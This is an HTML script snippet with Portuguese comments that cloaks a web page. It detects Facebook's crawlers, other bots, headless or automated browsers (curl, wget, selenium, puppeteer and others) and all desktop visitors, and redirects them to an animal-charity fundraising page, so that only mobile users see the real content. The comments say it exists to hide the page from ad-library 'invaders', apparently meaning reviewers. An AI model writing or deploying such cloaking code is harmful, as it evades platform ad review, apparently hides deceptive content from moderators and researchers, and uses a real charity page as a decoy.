    <!-- Cloaking: redireciona tráfego não legítimo ANTES da página carregar. Bots Facebook, desktop e invasores vão para URL alternativa. -->
    <script>
(function(){
  var ua = (typeof navigator !== 'undefined' && navigator.userAgent) ? navigator.userAgent : '';
  var u = ua.toLowerCase();
  var mobile = /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  
  // Detecta bots específicos do Facebook e catalogo
  var facebookBot = u.indexOf('facebookexternalhit') !== -1 || u.indexOf('facebot') !== -1 || u.indexOf('facebookcatalog') !== -1 || u.indexOf('facebook') !== -1;
  
  // Detecta outros bots e crawlers
  var otherBot = u.indexOf('googlebot') !== -1 || u.indexOf('bingbot') !== -1 || u.indexOf('crawler') !== -1 || u.indexOf('spider') !== -1 || u.indexOf('scraper') !== -1 || u.indexOf('headless') !== -1 || u.indexOf('phantom') !== -1 || u.indexOf('selenium') !== -1 || u.indexOf('puppeteer') !== -1 || u.indexOf('playwright') !== -1 || u.indexOf('curl') !== -1 || u.indexOf('wget') !== -1 || u.indexOf('python-requests') !== -1 || u.indexOf('go-http-client') !== -1;
  
  // Webdriver detection
  var webdriver = typeof navigator !== 'undefined' && (navigator.webdriver === true);
  
  // URL de redirecionamento para bots Facebook e invasores
  var REDIRECT_URL = 'https://www.vakinha.com.br/vaquinha/ajude-os-animais-da-uipa-colabore-com-a-nossa-vakinha?utm_internal_source=recommended_campaigns_show~';
  
  // Redireciona se:
  // 1. É bot do Facebook (facebookexternalhit, facebot, facebookcatalog)
  // 2. É outro bot/crawler
  // 3. Está usando webdriver (automação)
  // 4. NÃO é mobile (desktop = possível invasor da biblioteca de anúncios)
  if (facebookBot || otherBot || webdriver || !mobile) {
    try { 
      location.replace(REDIRECT_URL); 
    } catch (e) {}
  }
})();
    </script>
